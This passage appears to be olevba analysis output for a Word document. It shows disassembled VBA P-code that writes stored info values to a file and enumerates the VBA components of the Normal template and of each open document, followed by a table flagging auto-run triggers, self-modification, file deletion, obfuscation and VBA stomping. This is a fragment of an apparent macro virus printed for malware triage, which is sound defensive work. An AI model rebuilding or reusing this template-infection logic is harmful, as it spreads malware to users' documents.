' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info9 
' 	PrintItemNL 
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info2 
' 	PrintItemNL 
' Line #274:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info10 
' 	PrintItemNL 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info11 
' 	PrintItemNL 
' Line #276:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info3 
' 	PrintItemNL 
' Line #277:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info4 
' 	PrintItemNL 
' Line #278:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info5 
' 	PrintItemNL 
' Line #279:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info12 
' 	PrintItemNL 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info14 
' 	PrintItemNL 
' Line #281:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info15 
' 	PrintItemNL 
' Line #282:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info16 
' 	PrintItemNL 
' Line #283:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info6 
' 	PrintItemNL 
' Line #284:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info7 
' 	PrintItemNL 
' Line #285:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info13 
' 	PrintItemNL 
' Line #286:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info11 
' 	PrintItemNL 
' Line #287:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info8 
' 	PrintItemNL 
' Line #288:
' Line #289:
' Line #290:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #291:
' Line #292:
' 	Label errcreate 
' Line #293:
' Line #294:
' 	EndSub 
' Line #295:
' Line #296:
' 	FuncDefn (Sub Fnames())
' Line #297:
' 	OnError fname_end 
' Line #298:
' Line #299:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsLd IsEmpty 0x0001 
' 	St fnamet 
' Line #300:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	St fnamet2 
' Line #301:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #302:
' 	LitVarSpecial (Empty)
' 	St fnamed 
' Line #303:
' 	LitVarSpecial (Empty)
' 	St fnamed2 
' Line #304:
' 	LitVarSpecial (Empty)
' 	St projcount 
' Line #305:
' 	LitDI2 0x0002 
' 	Ld y 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd Collection 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St projcount 
' Line #306:
' 	StartForVariable 
' 	Ld w 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld projcount 
' 	Paren 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #307:
' 	LitDI2 0x0002 
' 	Ld y 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsLd IsEmpty 0x0001 
' 	St fnamed 
' Line #308:
' 	Ld w 
' 	Ld y 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St fnamed2 
' Line #309:
' 	StartForVariable 
' 	Ld w 
' 	EndForVariable 
' 	NextVar 
' Line #310:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #311:
' Line #312:
' 	Label fname_end 
' Line #313:
' 	ExitSub 
' Line #314:
' Line #315:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

